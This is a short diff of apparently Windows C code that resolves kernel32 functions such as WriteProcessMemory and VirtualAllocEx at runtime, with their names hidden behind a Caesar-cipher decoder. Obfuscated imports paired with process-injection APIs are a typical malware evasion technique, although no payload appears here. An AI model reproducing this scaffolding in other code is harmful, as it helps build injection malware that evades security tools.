@@ -41,6 +41,9 @@ void InitApis() {
 	Api.Process32NextW = (TProcess32NextW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Uwthjxx87Sj}y\\"));
 	Api.IsWow64Process = (TIsWow64Process)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Nx\\t|;9Uwthjxx"));
 	Api.WriteProcessMemory = (TWriteProcessMemory)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjUwthjxxRjrtw~"));
+	Api.VirtualAllocEx = (TVirtualAllocEx)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("[nwyzfqFqqthJ}"));
+	Api.SetFilePointer = (TSetFilePointer)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("XjyKnqjUtnsyjw"));
+	Api.GetFileSizeEx = (TGetFileSizeEx)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("LjyKnqjXn\x7fjJ}")); //GetFileSieEx
 
 	hMsvcrt = LoadLibraryA(CAESAR_DECRYPT("rx{hwy3iqq"));
 	if (!hMsvcrt) {
